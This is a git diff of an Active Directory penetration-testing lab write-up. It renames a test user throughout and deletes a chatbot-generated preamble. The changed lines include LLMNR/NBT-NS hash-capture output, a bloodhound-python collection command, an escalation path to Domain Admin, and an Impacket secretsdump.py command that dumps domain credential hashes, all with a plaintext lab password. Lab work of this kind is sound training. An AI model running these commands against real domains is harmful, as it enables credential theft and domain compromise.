@@ -1,8 +1,3 @@
-Here is the **TECHNICAL_EXECUTION.md in proper GitHub Markdown format**, structured cleanly with headings, code blocks, outputs, and conclusions. You can directly upload this file.
-
----
-
-````markdown
 # 🔬 Technical Execution
 
 This document provides the detailed technical steps, commands, outputs, and conclusions from the Active Directory Penetration Testing Lab.
@@ -99,8 +94,8 @@ Enumerates:
 
 ```text
 Users:
-employee1
-employee2
+Raghav1
+ragh
 admin1
 Administrator
 Guest
@@ -151,8 +146,8 @@ Performs LLMNR and NBT-NS poisoning to intercept NTLM authentication hashes.
 ```text
 [SMB] NTLMv2 Hash captured
 
-Username: employee1
-Hash: employee1::CORP:1122334455667788:ABCDEF1234567890
+Username: Raghav1
+Hash: Raghav1::CORP:1122334455667788:ABCDEF1234567890
 ```
 
 ---
@@ -182,7 +177,7 @@ BloodHound
 ## Command Executed
 
 ```bash
-bloodhound-python -d corp.local -u employee1 -p Password@123 -dc 192.168.10.10 -c all
+bloodhound-python -d corp.local -u Raghav1 -p Password@123 -dc 192.168.10.10 -c all
 ```
 
 ---
@@ -202,7 +197,7 @@ Collects:
 ```text
 Privilege Escalation Path Found:
 
-employee1 → IT Support Group → Domain Admin Privileges
+Raghav1 → IT Support Group → Domain Admin Privileges
 ```
 
 ---
@@ -232,7 +227,7 @@ Impacket SecretsDump
 ## Command Executed
 
 ```bash
-secretsdump.py corp.local/employee1:Password@123@192.168.10.10
+secretsdump.py corp.local/Raghav1:Password@123@192.168.10.10
 ```
 
 ---
